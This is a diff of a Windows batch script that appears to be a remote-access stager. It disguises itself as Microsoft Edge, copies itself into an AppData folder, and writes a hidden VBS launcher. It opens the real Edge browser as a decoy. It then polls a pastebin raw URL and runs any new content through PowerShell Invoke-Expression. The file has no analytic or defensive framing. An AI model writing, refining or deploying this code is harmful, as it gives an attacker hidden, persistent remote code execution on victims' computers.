@@ -1,48 +1,52 @@
 @echo off
-
+title MicrosoftEdge
 ::PASTEBIN RAW LINK
-set "raw_link=Pastebin_URL"
+set "raw_link=LINK"
 ::PASTEBIN RAW LINK
 
 setlocal enabledelayedexpansion
 set "batch_location=%~dp0"
 set "batch_name=%~nx0"
-
-if exist "%localappdata%\Microsoft_Edge\" (
+if exist "%appdata%\MicrosoftEdge\" (
   echo.
 ) else (
-    md "%localappdata%\Microsoft_Edge\"
+    md "%appdata%\MicrosoftEdge\"
 )
 
-if "%batch_location%"=="%localappdata%\Microsoft_Edge\" (
-echo.
+if "%batch_location%"=="%appdata%\MicrosoftEdge\" (
+  echo.
 ) else (
-  if exist "%localappdata%\Microsoft_Edge\MicrosoftEdge.bat" (
+  if exist "%appdata%\MicrosoftEdge\MicrosoftEdge.bat" (
     echo.
   ) else (
-    xcopy "%batch_location%%batch_name%" "%localappdata%\Microsoft_Edge\"
-    ren %localappdata%\Microsoft_Edge\%batch_name% MicrosoftEdge.bat
+    xcopy "%batch_location%%batch_name%" "%appdata%\MicrosoftEdge\"
+    ren %appdata%\MicrosoftEdge\%batch_name% MicrosoftEdge.bat
   )
 )
-
-
-if exist "%localappdata%\Microsoft_Edge\inv.vbs" ( 
-goto root
+if exist "%appdata%\MicrosoftEdge\inv.vbs" (
+  goto root
 ) else (
-(
-echo Set WshShell = CreateObject("WScript.Shell")
-echo WshShell.Run "cmd /c MicrosoftEdge.bat", 0, False
-echo Set WshShell = Nothing
-) > "%localappdata%\Microsoft_Edge\inv.vbs"
+echo CreateObject("WScript.Shell"^).Run "%appdata%\MicrosoftEdge\inv.vbs 1", 0, False > "%appdata%\MicrosoftEdge\inv.vbs"
+  start msedge
 )
+endlocal
+
 exit
 
-
-
-
-
-
 :root
+if "%batch_location%"=="%appdata%\MicrosoftEdge\" (
+  echo.
+) else (
+start msedge
+exit
+)
+if "%1"=="" (
+  start msedge
+  exit
+) else (
+echo.
+)
+
 if exist hash.txt (
 set /p previous_hash=<"hash.txt"
 ) else (
@@ -52,13 +56,11 @@ set "previous_hash="
 :monitor_loop
 echo Checking for updates...
 powershell -Command "Invoke-RestMethod -Uri '%raw_link%' | ForEach-Object { $_ } | Out-File -FilePath temp.txt -Encoding UTF8"
-
 powershell -Command "$hash = Get-FileHash -Path 'temp.txt' -Algorithm SHA256; echo $hash.Hash" > hash.txt
 set /p current_hash=<hash.txt
 if "%current_hash%" NEQ "%previous_hash%" (
   echo Done
   powershell -Command "Get-Content temp.txt | Invoke-Expression"
-
   set "previous_hash=%current_hash%"
 )
 
